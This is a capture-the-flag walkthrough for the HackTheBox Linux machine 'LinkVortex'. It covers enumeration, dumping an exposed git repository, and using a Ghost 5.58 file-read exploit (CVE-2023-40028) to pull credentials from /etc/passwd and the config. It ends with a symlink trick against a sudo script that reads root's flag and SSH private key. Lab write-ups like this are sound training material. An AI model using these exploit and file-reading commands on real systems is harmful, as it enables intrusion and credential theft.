---
authors:
    - Jiri Raja
date: 08-10-2025
---
# LinkVortex
Linux machine

## Foothold

Run nmap:
```shell
nmap -sC -sV -vv 10.10.11.47
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We see a redirect, update the `/etc/hosts`

Visit the website.

We find it's powered by Ghost (bottom of the page). Use whatweb to determine the version:

```shell
whatweb linkvortex.htb
```

Result is version `5.58`:

```shell
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

!!! note

    The version is also displayed in the index file 
    ```html
        <meta name="generator" content="Ghost 5.58">
    ```

A quick search of `Ghost 5.58 cve` gives us [File read exploit](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/README.md). It states information about Ghost CMS. Let's search that. We get official page and once we go to the [documentation](https://ghost.org/docs/install/ubuntu/#install-nodejs) we can see it's a javascript application installable with npm.

If we try to look at the documentation and search for `login`, we will get after going through the documentation the suffix `/ghost/api`. This means that ghost is using the ghost suffix for its pages. Let's try to access <http://linkvortex.htb/ghost>.

The other way is to simply enumerate. However, we get redirects always, so we use the `-r` flag:
```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://linkvortex.htb/FUZZ -r
```

```
About                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 669ms]
LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 271ms]
RSS                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 645ms]
about                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 765ms]
amp                     [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 612ms]
cpu                     [Status: 200, Size: 15472, Words: 2835, Lines: 277, Duration: 811ms]
favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 306ms]
feed                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 447ms]
ghost                   [Status: 200, Size: 3787, Words: 340, Lines: 65, Duration: 371ms]
private                 [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 449ms]
ram                     [Status: 200, Size: 14746, Words: 2780, Lines: 277, Duration: 833ms]
robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 145ms]
rss                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 598ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 31ms]
sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 124ms]
```

The last option is to check for `robots.txt`.

We get redirect to sign in <http://linkvortex.htb/ghost/#/signin>.

We saw that the posts were done by admin, so let's try that `admin@linkvortex.htb` and check with the `forgot` button. It fails because it is unable to send a mail. If we try with a non-existent user, it says so. We can use this for enumeration.

Since we've found nothing, let's try to enumerate subdomains:

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -fs 230
```

We get:
```
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 37ms]
```

Update etc hosts and let's enumerate again:
```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://dev.linkvortex.htb/FUZZ
```

We get:
```
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 31ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 32ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 36ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 36ms]
```

Hmm... funny, the wordlist I use doesn't have `.git`.
Anyway... since it's a site under a construction, let's try to access <http://dev.linkvortex.htb/.git/>.

And there it is, let's search google for dumping git repository from a website and we get [git-dumper](https://github.com/arthaud/git-dumper).

Run it:
```bash
git-dumper http://dev.linkvortex.htb/ dev-linkvortex
```

```bash
cd dev-linkvortex
```

We can use `git status`, which will give us 2 files. one of them is `ghost/core/test/regression/api/admin/authentication.test.js`.

Once we view it, we see that there are credentials.
```bash
cat ghost/core/test/regression/api/admin/authentication.test.js | grep -E "mail \=|password \="
```

```
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';
            const email = 'test@example.com';
            const password = 'thisissupersafe';
```

These don't work, use the `admin@linkvortex.htb` mail in combination with the found passwords.

## User

Let's take the [exploit from earlier](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028).

```bash
./cve-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
```

Test it with `/etc/passwd`.

we can see the user node:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

Once we try to get `/.dockerenv` we find out we are in a Docker.

Now, the thing is, it should be obvious. You've cloned a repo with a file called `Dockerfile.ghost`.

In the file, there is a path with the config `/var/lib/ghost/config.production.json`. Use it in the LFI.

We get `bob@linkvortex.htb:fibber-talented-worth` from the mail section.

SSH to victim with the found credentials:
```bash
ssh bob@linkvortex.htb
```

Get the user flag.

## Root
Check for sudo privileges:
```bash
sudo -l
```
```
/usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Checkout the script:
```bash
cat /opt/ghost/clean_symlink.sh
```
We have to use a second simlink to bypass the validation.

The following will read the root flag.
```bash
ln -s /root/root.txt a
ln -s /tmp/.sad/a a.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/.sad/a.png
```

To get the root ssh key/access use the following instead:
```bash
ln -s /root/.ssh/id_rsa a
```
